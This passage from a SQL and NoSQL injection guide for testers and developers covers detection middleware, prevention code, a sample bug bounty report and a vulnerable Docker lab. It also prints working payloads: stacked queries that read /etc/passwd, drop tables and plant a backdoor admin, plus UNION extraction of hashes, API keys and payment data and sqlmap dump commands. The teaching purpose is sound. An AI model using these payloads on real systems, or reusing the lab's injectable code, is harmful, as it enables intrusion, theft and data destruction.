-- ALTER ROLE if you can
ALTER ROLE current_user WITH SUPERUSER;

-- Check for writable directories
COPY (SELECT 'test') TO '/tmp/test.txt';
```

### PostgreSQL Stacked Queries

PostgreSQL supports stacked queries (multiple statements separated by semicolons), making it one of the most dangerous database targets for injection:

```sql
'; CREATE TABLE exfil (data text); COPY exfil FROM '/etc/passwd'; SELECT * FROM exfil; --
'; DROP TABLE users; --
'; INSERT INTO users (username, password_hash, role) VALUES ('backdoor', '$2b$10$fakehash', 'admin'); --
```

### Blind PostgreSQL Injection

```sql
-- Boolean-based
AND (SELECT CASE WHEN (1=1) THEN true ELSE false END)

-- Extracting data
AND (SELECT CASE WHEN (SUBSTRING(version(),1,1)='P') THEN true ELSE false END)

-- Time-based
; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END; --

-- Heavy query-based (no sleep function needed)
AND (SELECT COUNT(*) FROM generate_series(1,10000000)) > 0
```

---

## 14. Detection Strategies

### Application-Level Detection

```javascript
// Middleware to detect SQL injection attempts
const SQLI_PATTERNS = [
  /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER|CREATE|EXEC)\b)/i,
  /(\b(OR|AND)\b\s+\d+\s*=\s*\d+)/i,
  /(--|#|\/\*)/,
  /(\bSLEEP\b|\bBENCHMARK\b|\bpg_sleep\b|\bWAITFOR\b)/i,
  /(\bCONCAT\b|\bCHAR\b|\bCONVERT\b|\bCAST\b.*\bAS\b)/i,
  /('.*(\bOR\b|\bAND\b).*')/i,
  /(\bINFORMATION_SCHEMA\b|\bpg_tables\b|\bpg_catalog\b)/i,
];

function sqlInjectionDetector(req, res, next) {
  const inputs = [
    ...Object.values(req.query || {}),
    ...Object.values(req.params || {}),
    ...(typeof req.body === 'object' ? Object.values(req.body || {}) : [req.body])
  ].filter(v => typeof v === 'string');

  for (const input of inputs) {
    for (const pattern of SQLI_PATTERNS) {
      if (pattern.test(input)) {
        logger.warn('Potential SQL injection detected', {
          ip: req.ip,
          path: req.path,
          method: req.method,
          pattern: pattern.source,
          input: input.substring(0, 200), // Truncate for logging
          userAgent: req.headers['user-agent']
        });

        // Option 1: Block the request
        // return res.status(403).json({ error: 'Forbidden' });

        // Option 2: Allow but flag for review (honeypot approach)
        req.flaggedForReview = true;
        break;
      }
    }
  }
  next();
}
```

### PostgreSQL Audit Logging

```sql
-- Enable query logging in postgresql.conf
-- log_statement = 'all'
-- log_min_duration_statement = 0

-- Or use pg_audit extension for fine-grained audit
CREATE EXTENSION pgaudit;
SET pgaudit.log = 'all';
SET pgaudit.log_parameter = on;
```

### AWS CloudWatch Alerts

```bash
# Create a metric filter for SQL injection patterns in application logs
aws logs put-metric-filter \
  --log-group-name "/app/api-server" \
  --filter-name "SQLInjectionAttempts" \
  --filter-pattern '{ $.message = "Potential SQL injection detected" }' \
  --metric-transformations \
    metricName=SQLInjectionAttempts,metricNamespace=Security,metricValue=1

# Create an alarm that triggers on threshold
aws cloudwatch put-metric-alarm \
  --alarm-name "HighSQLInjectionRate" \
  --metric-name SQLInjectionAttempts \
  --namespace Security \
  --statistic Sum \
  --period 300 \
  --threshold 10 \
  --comparison-operator GreaterThanThreshold \
  --evaluation-periods 1 \
  --alarm-actions arn:aws:sns:us-east-1:123456789:SecurityAlerts
```

### Linux System-Level Monitoring

```bash
# Monitor PostgreSQL query logs for suspicious patterns
tail -f /var/log/postgresql/postgresql-15-main.log | grep -iE "(union|select.*from.*information_schema|pg_sleep|cmdshell)"

# Monitor for unusual database connections
ss -tnp | grep 5432

# Audit database file access
auditctl -w /var/lib/postgresql/ -p rwa -k postgres_access
```

---

## 15. Prevention Strategies

### The Parameterized Query Standard

This is the primary defense. Every database driver in every language supports parameterized queries. There is no valid reason to concatenate user input into SQL strings.

**Node.js (pg):**

```javascript
// ALWAYS use parameterized queries
const result = await pool.query(
  'SELECT * FROM users WHERE username = $1 AND status = $2',
  [username, status]
);
```

**Python (psycopg2):**

```python
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND status = %s",
    (username, status)
)
```

**Python (SQLAlchemy):**

```python
result = session.execute(
    text("SELECT * FROM users WHERE username = :username"),
    {"username": username}
)
```

### Input Validation (Defense in Depth)

Parameterized queries are the primary defense. Input validation is a secondary layer:

```javascript
// Validate expected formats
const { body, validationResult } = require('express-validator');

app.post('/api/users/search',
  body('username')
    .isString()
    .isLength({ min: 1, max: 50 })
    .matches(/^[a-zA-Z0-9_.-]+$/),  // Allowlist characters
  body('role')
    .optional()
    .isIn(['user', 'moderator', 'admin']),
  (req, res, next) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    next();
  },
  searchUsersHandler
);
```

### Principle of Least Privilege for Database Accounts

```sql
-- Create a limited application user
CREATE USER app_user WITH PASSWORD 'strong_random_password';

-- Grant only necessary permissions
GRANT CONNECT ON DATABASE myapp TO app_user;
GRANT USAGE ON SCHEMA public TO app_user;
GRANT SELECT, INSERT, UPDATE ON users, orders, products TO app_user;

-- Explicitly deny dangerous operations
REVOKE CREATE ON SCHEMA public FROM app_user;
REVOKE ALL ON pg_catalog.pg_proc FROM app_user;

-- No file system access
REVOKE pg_read_server_files FROM app_user;
REVOKE pg_write_server_files FROM app_user;
REVOKE pg_execute_server_program FROM app_user;

-- No superuser privileges
-- (app_user should never be a superuser)
```

### Content Security in Error Responses

```javascript
// Centralized error handler that never leaks database details
app.use((err, req, res, next) => {
  // Log the full error internally
  logger.error('Unhandled error', {
    message: err.message,
    stack: err.stack,
    path: req.path,
    method: req.method,
    ip: req.ip
  });

  // Return generic message to client
  const statusCode = err.statusCode || 500;
  res.status(statusCode).json({
    error: statusCode === 500 ? 'Internal server error' : err.publicMessage || 'Error',
    requestId: req.id // For support reference
  });
});
```

### MongoDB-Specific Prevention

```javascript
// 1. Schema validation at the database level
db.createCollection("users", {
  validator: {
    $jsonSchema: {
      bsonType: "object",
      required: ["username", "email", "passwordHash"],
      properties: {
        username: { bsonType: "string", maxLength: 50 },
        email: { bsonType: "string" },
        passwordHash: { bsonType: "string" },
        role: { enum: ["user", "moderator", "admin"] }
      }
    }
  }
});

// 2. Disable server-side JavaScript
// In mongod.conf:
// security:
//   javascriptEnabled: false
// This prevents $where injection entirely

// 3. Use Mongoose with strict schemas
const userSchema = new mongoose.Schema({
  username: { type: String, required: true, maxlength: 50 },
  email: { type: String, required: true },
  passwordHash: { type: String, required: true },
  role: { type: String, enum: ['user', 'moderator', 'admin'], default: 'user' }
}, { strict: true }); // strict: true rejects fields not in schema
```

---

## 16. Bug Bounty Report Example

```
## Title
Blind SQL Injection in User Search API Endpoint Allows Full Database Extraction

## Severity
Critical (CVSS 9.1)

## Affected Endpoint
POST /api/v2/users/search

## Summary
The `username` field in the JSON request body of the user search endpoint
is vulnerable to blind SQL injection. The application uses PostgreSQL and
the input is concatenated directly into a SQL query without parameterization.
An attacker can extract the full contents of the database, including password
hashes, personal information, and API keys, using boolean-based and time-based
blind techniques.

## Steps to Reproduce

1. Authenticate as any user and obtain a valid session token.

2. Send the following request to confirm boolean-based injection:

   True condition (returns results):
   POST /api/v2/users/search HTTP/1.1
   Host: api.target.com
   Content-Type: application/json
   Authorization: Bearer <token>

   {"username": "admin' AND 1=1--"}

   False condition (returns empty):
   {"username": "admin' AND 1=2--"}

3. Extract the PostgreSQL version:
   {"username": "admin' AND SUBSTRING(version(),1,1)='P'--"}
   Response: 200 with results (confirms PostgreSQL)

4. Extract the admin password hash using binary search:
   {"username": "admin' AND ASCII(SUBSTRING((SELECT password_hash FROM users WHERE id=1),1,1))>80--"}

5. Automated extraction with sqlmap:
   sqlmap -u "https://api.target.com/api/v2/users/search" \
     --method POST \
     --data='{"username":"test"}' \
     --headers="Content-Type: application/json\nAuthorization: Bearer <token>" \
     -p username --dbms=postgresql --dump -D production -T users

   Result: Full users table extracted including 15,847 user records with
   bcrypt password hashes, email addresses, phone numbers, and API keys.

## Impact
- Full database extraction (all tables, all data)
- 15,847 user records including PII (emails, phone numbers, addresses)
- Password hashes (bcrypt, but crackable for weak passwords)
- Internal API keys and service account credentials
- Potential for command execution via PostgreSQL COPY TO PROGRAM
  (not tested to avoid damage to production systems)

## Remediation
Replace the vulnerable query with a parameterized version:

Current (vulnerable):
const query = `SELECT * FROM users WHERE username LIKE '%${search}%'`;
const result = await pool.query(query);

Fixed:
const result = await pool.query(
  'SELECT * FROM users WHERE username LIKE $1',
  [`%${search}%`]
);

Additionally:
- Audit all raw SQL queries across the codebase for similar patterns
- Implement input validation as defense-in-depth
- Restrict the database user's permissions (remove file read/write access)
- Add SQL injection detection to WAF rules
- Enable PostgreSQL query logging and audit

## Timeline
- 2024-01-15: Vulnerability discovered
- 2024-01-15: Report submitted
- 2024-01-16: Triaged as Critical
- 2024-01-17: Fix deployed to production
- 2024-01-20: Bounty awarded: $5,000

## Proof of Concept
[Attached: sqlmap output log, extracted sample data (redacted), HTTP
request/response captures from Burp Suite]
```

---

## 17. Realistic PoC: Complete Exploitation Flow

### Scenario: E-Commerce API with PostgreSQL

**Step 1: Identify the injection point**

```http
POST /api/products/search HTTP/1.1
Host: api.shop.target.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...

{"category": "electronics", "price_max": "1000"}
```

Test `price_max` with a quote:

```json
{"category": "electronics", "price_max": "1000'"}
```

Response:
```json
{"error": "unterminated quoted string at or near \"'\" at character 68"}
```

PostgreSQL error confirmed. The `price_max` parameter is injectable.

**Step 2: Determine column count**

```json
{"category": "electronics", "price_max": "1000' ORDER BY 5--"}
```
Response: 200 (5 columns or fewer)

```json
{"category": "electronics", "price_max": "1000' ORDER BY 6--"}
```
Response: Error (only 5 columns)

**Step 3: UNION-based extraction**

```json
{"category": "electronics", "price_max": "1000' UNION SELECT NULL,NULL,NULL,NULL,NULL--"}
```
Response: 200 with an extra row of nulls.

```json
{"category": "electronics", "price_max": "1000' UNION SELECT 'a','b','c','d','e'--"}
```
Identify which columns appear in the response by checking which letters show up.

**Step 4: Extract database metadata**

```json
{"category": "electronics", "price_max": "1000' UNION SELECT table_name,column_name,data_type,NULL,NULL FROM information_schema.columns WHERE table_schema='public'--"}
```

Discovered tables: `users`, `orders`, `payment_methods`, `admin_sessions`.

**Step 5: Extract sensitive data**

```json
{"category": "electronics", "price_max": "1000' UNION SELECT username,email,password_hash,role,api_key FROM users--"}
```

**Step 6: Extract payment data**

```json
{"category": "electronics", "price_max": "1000' UNION SELECT card_last_four,card_type,billing_address,user_id::text,NULL FROM payment_methods--"}
```

**Step 7: Read server configuration**

```json
{"category": "electronics", "price_max": "1000' UNION SELECT pg_read_file('/etc/passwd'),NULL,NULL,NULL,NULL--"}
```

---

## 18. Burp Suite SQL/NoSQL Injection Testing Workflow

### Systematic Approach

**Phase 1: Map the Attack Surface**

1. Spider/crawl the application through Burp Proxy.
2. Review all API endpoints in the Site Map.
3. Identify every parameter in every request: JSON body fields, query parameters, path segments, headers, cookies.
4. Flag parameters that are likely used in database queries: search, filter, sort, id, name, category, date ranges.

**Phase 2: Active Testing with Repeater**

For each candidate parameter:

1. Send the request to Repeater.
2. Test with a single quote `'` and observe the response.
3. Test with a double quote `"` and observe.
4. Test with a backslash `\` and observe.
5. Compare responses: error vs. normal vs. different status code.
6. Test boolean conditions:
   - True condition: `' AND '1'='1` (should behave normally)
   - False condition: `' AND '1'='2` (should differ)

**Phase 3: Confirm and Classify**

If behavior differs between true and false conditions:
- If data is reflected: UNION-based is possible.
- If errors are reflected: error-based extraction.
- If only boolean difference: boolean-based blind.
- If no observable difference: try time-based (`pg_sleep`, `SLEEP`).
- If none of the above: try out-of-band (DNS, HTTP callback via Burp Collaborator).

**Phase 4: Automated Scanning**

1. Right-click the request > Scan > Active scan.
2. Burp Scanner will test for SQLi, NoSQL injection, and other vulnerabilities.
3. Review results in the Dashboard > Issue activity.

**Phase 5: NoSQL-Specific Testing**

For MongoDB-backed endpoints:

1. Replace string values with JSON objects:
   ```json
   {"username": {"$ne": ""}}
   {"password": {"$gt": ""}}
   {"email": {"$regex": ".*"}}
   ```

2. Test `$where` injection:
   ```json
   {"$where": "1==1"}
   {"$where": "sleep(5000)"}
   ```

3. Test array injection:
   ```json
   {"username": ["admin"]}
   {"username": {"$in": ["admin", "root"]}}
   ```

### Using Burp Intruder for Payload Fuzzing

1. Send a request with a potentially injectable parameter to Intruder.
2. Mark the parameter value as the injection point.
3. Load a SQL injection payload list (e.g., from SecLists):
   ```
   /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
   /usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt
   /usr/share/seclists/NoSQL-Injection/NoSQLi.txt
   ```
4. Set payload encoding rules (disable URL encoding for JSON bodies).
5. Run the attack and grep responses for error indicators:
   - `syntax error`
   - `unterminated`
   - `SQLSTATE`
   - `pg_catalog`
   - `MongoError`
   - `CastError`
   - Stack traces

---

## 19. Common Developer Mistakes

1. **"I use an ORM, so I am safe."** ORMs provide raw query methods. Every one of them. If any code path uses raw SQL with string interpolation, the ORM provides zero protection.

2. **"JSON body input is safe."** JSON parsing produces regular strings. If those strings are concatenated into SQL, the injection vector is the same as a URL parameter.

3. **"I validate input types with TypeScript/type hints."** Type annotations are a compile-time or documentation mechanism. They are not runtime sanitization. A `string` parameter can contain SQL injection payloads.

4. **"MongoDB is not SQL, so SQL injection does not apply."** Correct -- SQL injection does not apply. NoSQL injection applies instead. Operator injection (`$ne`, `$gt`, `$regex`) is the MongoDB equivalent.

5. **"My WAF blocks SQL injection."** WAFs are a supplementary defense that can be bypassed. They are not a replacement for parameterized queries. Every WAF bypass technique in Section 11 demonstrates this.

6. **"I sanitize by escaping quotes."** Custom escaping is error-prone and database-specific. Parameterized queries handle this at the driver level. There are documented bypasses for quote escaping in every database.

7. **"The parameter is an integer, so it is safe."** The parameter might be expected to be an integer, but if it arrives as a string from the HTTP request and is concatenated without parameterization, injection is possible: `1 OR 1=1`.

8. **"Error messages are disabled in production."** Error-based injection is only one technique. Blind boolean-based, time-based, and out-of-band injection work without error messages.

9. **"We only use SELECT queries."** If the database supports stacked queries (PostgreSQL does), an attacker can append INSERT, UPDATE, DELETE, DROP, or COPY TO PROGRAM after a SELECT injection point.

10. **"Second-order injection is theoretical."** It is not. It is regularly found in applications that parameterize user input on insertion but use stored values unsafely in background jobs, reports, or admin panels.

---

## 20. Lab Setup Ideas

### Docker-Based Vulnerable SQL Injection Lab

```yaml
# docker-compose.yml
version: '3.8'
services:
  vulnerable-api:
    build: .
    ports:
      - "3000:3000"
    environment:
      - DATABASE_URL=postgresql://app:app123@postgres:5432/vulnlab
      - MONGO_URL=mongodb://mongo:27017/vulnlab
    depends_on:
      - postgres
      - mongo

  postgres:
    image: postgres:15-alpine
    environment:
      POSTGRES_DB: vulnlab
      POSTGRES_USER: app
      POSTGRES_PASSWORD: app123
    ports:
      - "5432:5432"
    volumes:
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql

  mongo:
    image: mongo:7
    ports:
      - "27017:27017"
    volumes:
      - ./mongo-init.js:/docker-entrypoint-initdb.d/mongo-init.js
```

**Database initialization (`init.sql`):**

```sql
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    email VARCHAR(100) NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    role VARCHAR(20) DEFAULT 'user',
    api_key VARCHAR(64),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE products (
    id SERIAL PRIMARY KEY,
    name VARCHAR(100) NOT NULL,
    description TEXT,
    price DECIMAL(10,2),
    category VARCHAR(50),
    stock INTEGER DEFAULT 0
);

CREATE TABLE orders (
    id SERIAL PRIMARY KEY,
    user_id INTEGER REFERENCES users(id),
    product_id INTEGER REFERENCES products(id),
    quantity INTEGER,
    total DECIMAL(10,2),
    status VARCHAR(20) DEFAULT 'pending',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Seed data
INSERT INTO users (username, email, password_hash, role, api_key) VALUES
('admin', 'admin@vulnlab.com', '$2b$10$rqzvhLPWkaIGBMoR7LqxMO9F7CUvPLMYUjdT7pNSqGx8fVtJiCKy6', 'admin', 'sk_live_admin_key_do_not_share_1234567890'),
('alice', 'alice@example.com', '$2b$10$abcdefghijklmnopqrstuvwxyz1234567890ABCDEF', 'user', NULL),
('bob', 'bob@example.com', '$2b$10$123456789abcdefghijklmnopqrstuvwxyzABCDEFGH', 'user', NULL);

INSERT INTO products (name, description, price, category, stock) VALUES
('Laptop', 'High-performance laptop', 999.99, 'electronics', 50),
('Phone', 'Latest smartphone', 699.99, 'electronics', 100),
('Book', 'Security testing guide', 49.99, 'books', 200);
```

**MongoDB initialization (`mongo-init.js`):**

```javascript
db = db.getSiblingDB('vulnlab');

db.createCollection('users');
db.users.insertMany([
  {
    username: 'admin',
    email: 'admin@vulnlab.com',
    password: 'admin123',  // Intentionally plain text for testing
    role: 'admin'
  },
  {
    username: 'alice',
    email: 'alice@example.com',
    password: 'alice456',
    role: 'user'
  }
]);
```

**Vulnerable API server:**

```javascript
const express = require('express');
const { Pool } = require('pg');
const { MongoClient } = require('mongodb');
const app = express();
app.use(express.json());

const pgPool = new Pool({ connectionString: process.env.DATABASE_URL });
let mongoDb;

MongoClient.connect(process.env.MONGO_URL).then(client => {
  mongoDb = client.db('vulnlab');
});

// VULNERABLE: SQL injection in search
app.post('/api/sql/search', async (req, res) => {
  const { username } = req.body;
  try {
    const result = await pgPool.query(
      `SELECT id, username, email FROM users WHERE username LIKE '%${username}%'`
    );
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// VULNERABLE: SQL injection in path param
app.get('/api/sql/user/:id', async (req, res) => {
  try {
    const result = await pgPool.query(
      `SELECT id, username, email, role FROM users WHERE id = ${req.params.id}`
    );
    res.json(result.rows[0] || { error: 'Not found' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// VULNERABLE: Blind SQL injection
app.get('/api/sql/exists', async (req, res) => {
  const { username } = req.query;
  try {
    const result = await pgPool.query(
      `SELECT 1 FROM users WHERE username = '${username}'`
    );
    res.json({ exists: result.rows.length > 0 });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// VULNERABLE: MongoDB NoSQL injection
app.post('/api/nosql/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await mongoDb.collection('users').findOne({
    username: username,
    password: password
  });
  if (user) {
    res.json({ message: 'Login successful', user: { username: user.username, role: user.role } });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// VULNERABLE: MongoDB search with $where
app.post('/api/nosql/search', async (req, res) => {
  const { query } = req.body;
  const results = await mongoDb.collection('users').find({
    $where: `this.username.includes('${query}')`
  }).toArray();
  res.json(results.map(u => ({ username: u.username, email: u.email })));
});

app.listen(3000, () => console.log('Vulnerable lab running on :3000'));
```

### Additional Practice Resources

- **PortSwigger Web Security Academy**: Comprehensive SQL injection labs with guided solutions covering UNION, blind, second-order, and NoSQL injection.
- **DVWA (Damn Vulnerable Web Application)**: Classic SQL injection levels from low to impossible difficulty.
- **SQLi-labs (by Audi-1)**: 75+ levels of SQL injection challenges covering virtually every technique.
- **Hack The Box**: Machines with realistic SQL injection in modern application stacks.
- **NoSQLMap**: Automated NoSQL injection tool with its own test environment.

---

## Conclusion

SQL injection and NoSQL injection are not legacy vulnerabilities. They are active, evolving threats that have adapted to every modern application pattern. JSON APIs, GraphQL resolvers, ORM raw queries, document databases -- each of these surfaces has its own injection grammar, and attackers are fluent in all of them.

The defense is not complicated. Parameterized queries prevent SQL injection. Type checking prevents NoSQL operator injection. These are solved problems at the technical level. The unsolved problem is organizational: ensuring that every developer, on every team, in every code review, applies these patterns consistently, including in raw query escape hatches, background jobs, admin panels, and migration scripts -- everywhere that user-influenced data touches a database query.

If you are a penetration tester or bug bounty hunter, modern injection testing requires testing JSON bodies, GraphQL variables, and every ORM raw query path. The classic quote-in-a-form-field is rare in modern applications, but the underlying vulnerability is everywhere. You just need to know where to look and how to speak the application's query language.

Test your own applications systematically. Audit every raw query. Treat every stored value as untrusted. The cost of a parameterized query is zero. The cost of a SQL injection breach is measured in millions of dollars, regulatory fines, and destroyed trust.

---

*If this guide helped you find or fix an injection vulnerability, share it with developers on your team. Every developer who understands these attacks is one fewer injection point in production. The best security investment is education.*
